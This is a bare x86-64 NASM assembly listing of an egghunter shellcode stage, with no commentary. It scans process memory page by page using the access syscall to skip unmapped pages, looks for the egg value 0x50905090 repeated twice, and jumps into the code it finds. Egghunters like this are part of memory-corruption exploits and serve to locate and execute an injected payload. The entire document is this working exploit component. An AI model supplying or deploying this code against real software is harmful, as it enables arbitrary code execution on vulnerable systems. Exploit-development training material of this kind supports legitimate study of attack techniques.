global _start

section .text

_start:

	; half egg
	mov ebx, 0x50905090
	xor rcx, rcx
	mul rcx

switch_page:

	or dx, 0xfff

scan_page:

	inc rdx

	; pusha
	push rax
	push rbx
	push rcx
	push rdx
	push rdi
	push rsi

	xor rsi, rsi
	lea rdi, [rdx+0x4]
	mov al, 21
	syscall

	cmp al, 0xf2

	; popa
	pop rsi
	pop rdi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	jz switch_page

	cmp dword [rdx], ebx
	jnz scan_page

	cmp dword [rdx+0x4], ebx
	jnz scan_page
	jmp rdx
